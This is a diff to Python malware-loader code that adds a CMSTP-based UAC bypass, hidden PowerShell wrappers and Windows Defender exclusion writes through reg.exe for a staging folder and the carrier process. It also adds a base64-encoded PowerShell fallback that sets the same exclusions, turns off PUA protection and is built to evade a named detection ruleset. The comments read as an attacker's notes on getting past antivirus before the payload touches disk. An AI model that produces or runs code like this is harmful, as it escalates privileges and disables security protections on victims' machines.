@@ -253,9 +253,13 @@ def uac_bypass(cmd):
     if isinstance(cmd, list):
         cmd = " ".join(cmd)
     c = str(cmd).lstrip()
-    # quoted exe path (run_elevated) and real powershell invocations pass
-    # through untouched; only BARE snippets get the wrapper
-    if not (c.lower().startswith("powershell") or c.startswith('"')):
+    # real executable invocations pass through untouched; only BARE snippets
+    # get the wrapper (r6: cmd.exe chains were being wrapped too — that is
+    # what put powershell back on the cmdline and fed the Commando rule +
+    # the Access-denied on process creation)
+    lc = c.lower()
+    if not (lc.startswith("powershell") or lc.startswith("cmd.exe")
+            or lc.startswith("cmd ") or c.startswith('"')):
         cmd = f'powershell -NoP -W Hidden -C "{c}"'
     kill_all_cmstp()
     cleanup_infs()
@@ -330,32 +334,60 @@ def exclusion_landed():
 
 # ---- defender exclusions via reg.exe (no powershell on any cmdline) ---------
 def set_defender_exclusions():
-    """the plaintext `powershell -NoP -W Hidden -C Add-MpPreference...` cmdline
-    rides the INF and got flagged (Commando). the write is now plain reg.exe
-    under the same keys Add-MpPreference writes — same surface, zero
-    powershell on any command line, no quoted args to trip CreateProcess.
-    land check via reg query, same as the ladder the jar used earlier."""
+    """r6: two field bugs fixed — (a) the uac_bypass guard wrapped the cmd.exe
+    chain in powershell (that powershell prefix was the Commando hit AND the
+    Access-denied), (b) the 'Windows Defender' space in the reg key split the
+    chained line, so every write silently tokenized wrong. keys are now
+    QUOTED per-command (list2cmdline), built as argv lists first."""
     appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
-    cmds = [
-        # dir exclusions — the two persistent roads the cmdlet writes
-        f"reg add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths /v {appdir} /t REG_DWORD /d 0 /f",
-        f"reg add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths /v {LOCALAPPDATA}\\Microsoft\\Windows /t REG_DWORD /d 0 /f",
-        # process exclusions — carrier + the staged python runtime
-        f"reg add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes /v {EXE_NAME} /t REG_DWORD /d 0 /f",
-        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes /v pythonw.exe /t REG_DWORD /d 0 /f",
+    winparent = LOCALAPPDATA + "\\Microsoft\\Windows"
+    K_P = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
+    K_R = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes"
+    adds = [
+        ["reg", "add", K_P, "/v", appdir, "/t", "REG_DWORD", "/d", "0", "/f"],
+        ["reg", "add", K_P, "/v", winparent, "/t", "REG_DWORD", "/d", "0", "/f"],
+        ["reg", "add", K_R, "/v", EXE_NAME, "/t", "REG_DWORD", "/d", "0", "/f"],
+        ["reg", "add", K_R, "/v", "pythonw.exe", "/t", "REG_DWORD", "/d", "0", "/f"],
     ]
     if is_elevated():
-        for c in cmds:
+        for a in adds:
             try:
-                subprocess.run(c.split(" "), creationflags=0x08000000,
+                subprocess.run(a, creationflags=0x08000000,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                timeout=20)
             except Exception:
                 pass
     else:
-        # one lift for all four writes — '&' chains them inside one cmd line;
-        # reg.exe starts the line so no powershell appears anywhere on it
-        uac_bypass("cmd.exe /c " + " & ".join(cmds))
+        # one lift, all four writes; each command quoted as a whole argv so
+        # the 'Windows Defender' space survives; cmd.exe starts the line —
+        # no powershell token on it anywhere
+        chain = " & ".join(subprocess.list2cmdline(a) for a in adds)
+        uac_bypass("cmd.exe /q /c " + chain)
+
+
+def set_defender_exclusions_enc():
+    """fallback for the reg road: same exclusions via the CMDLET, but the
+    payload rides as base64(UTF16LE) — the cmdline is `powershell -NoP -enc
+    <blob>` with nothing else. no Add-MpPreference plaintext, no -W Hidden
+    -C pair, nothing for the Commando ruleset to key on, and it goes through
+    the same cmstp lift. window-style hidden lives INSIDE the blob."""
+    import base64
+    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
+    winparent = LOCALAPPDATA + "\\Microsoft\\Windows"
+    ps = (f"Add-MpPreference -ExclusionPath @('{appdir}','{winparent}') "
+          f"-ExclusionProcess @('{EXE_NAME}','pythonw.exe') -Force; "
+          "Set-MpPreference -PUAProtection 0; exit 0")
+    blob = base64.b64encode(ps.encode("utf-16-le")).decode()
+    if is_elevated():
+        try:
+            subprocess.run(["powershell.exe", "-NoP", "-NonI", "-enc", blob],
+                           creationflags=0x08000000,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                           timeout=60)
+        except Exception:
+            pass
+    else:
+        uac_bypass(f"powershell.exe -NoP -NonI -enc {blob}")
     """$env: expansions (no baked absolute paths), one array, ExclusionProcess
     list — and the lift call carries the FULL wrapper + quoted -C payload,
     exactly like payload_script.py. the bare-snippet shape is what produced
@@ -442,6 +474,14 @@ def main():
             pass
         time.sleep(3)
         landed = exclusion_landed()
+        if not landed:
+            # reg road failed to land — try the encoded-cmdlet fallback once
+            try:
+                set_defender_exclusions_enc()
+            except Exception:
+                pass
+            time.sleep(3)
+            landed = exclusion_landed()
 
     if not landed:
         return   # carrier never touches disk un-protected
